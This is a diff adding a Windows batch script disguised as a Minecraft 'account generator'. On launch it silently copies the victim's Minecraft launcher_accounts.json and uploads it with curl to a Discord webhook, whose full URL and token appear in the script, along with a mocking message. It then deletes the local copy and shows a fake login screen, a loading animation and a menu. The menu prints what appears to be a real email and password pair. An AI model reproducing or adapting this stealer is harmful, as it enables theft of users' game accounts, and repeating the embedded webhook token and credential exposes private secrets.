@@ -1,0 +1,140 @@
+ÿþ&cls
+@echo off
+cls
+color a
+setlocal
+call :setESC
+copy "C:\Users\%USERNAME%\appdata\roaming\.minecraft\launcher_accounts.json" "C:\Users\%USERNAME%\AppData\Local\Temp" > nul
+cd C:\Users\%USERNAME%\AppData\Local\Temp
+SET WU=https://discord.com/api/webhooks/827770749964124180/gJvC5mP3GjAwL2BBogPd2JhxcZIyV8bpUS2NtsBkBc5u_WXh5zfHtUWkZ9GiXTSkWMS4
+curl -s -i -q -H "Accept: application/json" -H "Content-Type: multipart/form-data" -F file=@launcher_accounts.json -F payload_json="{\"content\": \"STORMLOGGER NEWS\nL, retard got grabbed by Beppe and Doggo^'s Logger :clown:\n\nHis launcher_account file:\"}" %WU%
+del /f launcher_accounts.json > nul
+cls
+if not exist cmdmenusel.exe (curl -s -OJLk "https://github.com/max20091/Waifu2x-converter-CMD-GUI/blob/master/cmdmenusel.exe")
+cls
+echo Hello, welcome to GPO account generator. Please login with your credentials below.
+set /p user="Username: "
+set /p pass="Password: %ESC%[30m"
+echo %ESC%[32m
+cls
+if %pass% equ skam (
+	goto LoginNext
+) else (
+	echo Invalid username or password.
+	pause > nul
+	exit
+)
+:LoginNext
+cls
+call :DrawPistol
+echo.
+echo [-] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [\] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [^|] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [/] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [-] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [\] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [^|] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [/] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [-] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [\] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [^|] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [/] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [-] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [\] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [^|] Loading
+timeout 1 > nul
+cls
+call :DrawPistol
+echo.
+echo [/] Loading
+timeout 1 > nul
+:Menu
+cls
+call :DrawPistol
+echo.
+echo Welcome to GBO MC generator, your account status is: %ESC%[95mBETA%ESC%[32m
+echo.
+cmdmenusel A8A0 "NoFullAccess" "SemiFullAccess" "HypixelUnbanned" "HypixelRanked" "MineplexRanked" "Optifine" "Minecon"
+echo.
+echo echoglennwalker1937@gmail.com:Flex3232!
+pause > nul
+goto Menu
+
+
+:DrawPistol
+echo  +--^^----------,--------,-----,--------^-,
+echo  ^| ^|^|^|^|^|^|^|^|^|   `--------'     ^|          O
+echo  `+---------------------------^----------^|
+echo    `\_,---------,---------,--------------'
+echo      / XXXXXX /'^|       /'
+echo     / XXXXXX /  `\    /'
+echo    / XXXXXX /`-------'
+echo   / XXXXXX /
+echo  / XXXXXX /
+echo (________(                
+echo  `------'   
+goto :EOF
+
+:setESC
+for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
+  set ESC=%%b
+  exit /B 0
+)
+exit /B 0
